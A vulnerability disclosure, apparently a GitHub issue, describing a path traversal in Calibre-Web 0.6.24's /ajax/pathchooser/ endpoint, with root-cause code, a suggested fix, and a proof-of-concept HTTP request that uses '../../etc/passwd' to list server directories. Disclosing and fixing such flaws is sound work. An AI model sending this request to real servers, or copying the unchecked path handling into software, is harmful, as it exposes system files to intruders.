# [Security] Path Traversal in Calibre-Web 0.6.24 (/ajax/pathchooser/)

## Summary

A Path Traversal vulnerability exists in Calibre-Web 0.6.24 that allows an authenticated administrator to list arbitrary directories on the server filesystem via the `/ajax/pathchooser/` endpoint.

The application returns directory contents including file names, absolute paths, file sizes, and entry types, effectively exposing the server filesystem structure.

---

## Affected Version

* Calibre-Web 0.6.24

---

## Vulnerability Details

| Field    | Value                                            |
| -------- | ------------------------------------------------ |
| Type     | Path Traversal                                   |
| CWE      | CWE-22                                           |
| CVSS 3.1 | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9 Medium) |
| Endpoint | `/ajax/pathchooser/`                             |

---

## Impact

* Arbitrary directory listing
* Exposure of sensitive file paths
* Disclosure of system files (e.g., `/etc/passwd`)
* Information disclosure that may facilitate further attacks

---

## Root Cause

**File:** `cps/admin.py`
**Function:** `pathchooser()`

The application processes user-controlled input using `os.path.normpath()` but does not enforce any directory boundary restrictions.

```python
path = os.path.normpath(request.args.get('path', ""))
cwd = os.path.realpath(path)
folders = os.listdir(cwd)
```

### Issue:

* `normpath()` only normalizes input
* `realpath()` resolves symlinks
* ❌ No validation against a base directory
* ❌ No access control enforcement

This allows attackers to traverse outside intended directories and enumerate arbitrary filesystem locations.

---

## Proof of Concept

### Step 1 — Login as Administrator

Open browser and navigate to:

```text
http://localhost:8083/login
```

Login using administrator credentials.

---

### Step 2 — Open Path Chooser UI

Navigate to:

```
Admin → Configuration → Edit Calibre Database Configuration
```

Click the folder icon next to:

```
Location of Calibre Database
```

A popup titled **"Choose File Location"** appears.
<img width="1550" height="772" alt="image" src="https://github.com/user-attachments/assets/916533e5-0e51-4f21-a5e0-c658e1ef2744" />

---

### Step 3 — Observe Network Request

Open DevTools or Burp Suite.

When interacting with the folder browser, the application sends:

```http
GET /ajax/pathchooser/?path=<current_directory> HTTP/1.1
Host: localhost:8083
Cookie: session=<SESSION_COOKIE>
```
<img width="1860" height="838" alt="image" src="https://github.com/user-attachments/assets/514c02d6-9e02-4580-921e-7877aa1e0d96" />

---

### Step 4 — Exploit Path Traversal

Intercept the request using Burp Suite Repeater and modify the `path` parameter:

```http
GET /ajax/pathchooser/?path=../../etc/passwd HTTP/1.1
Host: localhost:8083
Cookie: session=<SESSION_COOKIE>
Accept: application/json
X-Requested-With: XMLHttpRequest
```
---

### Step 5 — Observe Response

The server responds with JSON containing directory listing information from the target path.

<img width="1616" height="645" alt="image" src="https://github.com/user-attachments/assets/a643c817-4da7-422f-9232-9751e45ba944" />

**This confirms arbitrary directory access.**

---

## Attack Requirements

* Authenticated administrator access

---

## Suggested Fix

Restrict file access to a predefined base directory.

```python
allowed_base = os.path.realpath(config.config_calibre_dir)
target = os.path.realpath(user_input_path)

if not target.startswith(allowed_base + os.sep) and target != allowed_base:
    abort(403)
```

---

## CWE Classification

* CWE-22: Path Traversal

---

## CVSS 3.1

```
AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
Score: 4.9 (Medium)
```

---

## Discoverer

neitsploit1707

---

## References

* https://github.com/xuantien177
* https://github.com/janeczku/calibre-web
